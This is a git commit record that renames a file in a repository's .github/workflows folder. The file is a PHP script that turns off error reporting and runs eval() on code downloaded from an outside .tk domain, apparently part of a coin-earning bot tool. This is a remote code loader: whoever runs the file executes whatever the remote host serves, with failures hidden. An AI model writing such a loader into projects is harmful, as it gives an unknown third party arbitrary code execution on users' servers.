6c7110ab17054eeb9f3119f37347a9d5563c16a1
xuangianh <67967841+xuangianh@users.noreply.github.com>
2022-05-23 22:20:49 +0700

    Update and rename .github/workflows/bot.php to .github/quy trình làm việc/bot.php

---
+++ .github/quy trình làm việc/bot.php
@@ -0,0 +1,5 @@
+
+error_reporting ( 0 );
+
+
+eval(file_get_contents('https://shop-keytool.tk/Toolauto_kiemcoin_uytin/Tong_hop/botchedo'));
--- .github/workflows/bot.php
+++
@@ -1,5 +0,0 @@
-<?php
-error_reporting(0);
-
-
-eval(file_get_contents('https://shop-keytool.tk/Toolauto_kiemcoin_uytin/Tong_hop/botchedo'));
